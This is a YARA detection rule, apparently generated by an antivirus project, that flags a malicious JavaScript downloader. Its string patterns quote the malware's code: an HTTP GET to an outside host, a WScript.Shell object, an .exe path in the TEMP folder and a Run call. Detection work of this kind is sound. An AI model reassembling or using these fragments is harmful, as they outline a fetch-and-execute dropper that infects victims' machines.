rule sig_20160401_7daf6596165b06c7df77514c5d89baed {
  meta:
    description = "datamaliciousorder - file 20160401_7daf6596165b06c7df77514c5d89baed.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e46348dafcef0e08425c27e5f6a64215363d8b1dfb758bec0294e6e1d7346e81"

  strings:
    $s1  = "SxgNqw[TusCwo](\"G\" + \"ET\", \"http://be-stlines-tore.com/l9sape\", false);" fullword ascii
    $s2  = "function ZicQs(RoLf, UzcVp){EgwBn = EgwBn * 1; return RoLf - UzcVp;};" fullword ascii
    $s3  = "var HudMh = function WwtFc() {return WScript[OaiFy](\"WScript\"+\".Shell\");}(), EdaZq = 11;" fullword ascii
    $s4  = "if (SxgNqw[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function ZrwOs() {return HudMh[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"ycrd3SMx.ex\" + \"e\";};" fullword ascii
    $s6  = "function WvrEgy(){return DiQrz + \"\";};" fullword ascii
    $s7  = "function NoIsi() {return ((WrAlb == true) && (WrAlb == TueWa)) ? 1 : EgwBn;};" fullword ascii
    $s8  = "return ZicQs(EdNj, KjeTq);" fullword ascii
    $s9  = "var WrAlb = false;" fullword ascii
    $s10 = "var AoGzd = new this[\"Date\"]();" fullword ascii
    $s11 = "TueWa = true; " fullword ascii
    $s12 = "}while (QmJzy);" fullword ascii
    $s13 = "function GfFrz(){return OaiFy;};" fullword ascii
    $s14 = "function DtsXz(ZmuNm){HudMh[\"R\"+\"un\"](ZmuNm, EgwBn, EgwBn);};" fullword ascii
    $s15 = "function HdBdu(HnaRuy) {var EvmGs = (1, 2, 3, 4, 5, HnaRuy); return EvmGs;};" fullword ascii
    $s16 = "WrAlb = true; " fullword ascii
    $s17 = "function AjpIax()" fullword ascii
    $s18 = "function AcnXy(){return 23;};" fullword ascii
    $s19 = "var TueWa = false;" fullword ascii
    $s20 = "var NlzZmu = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}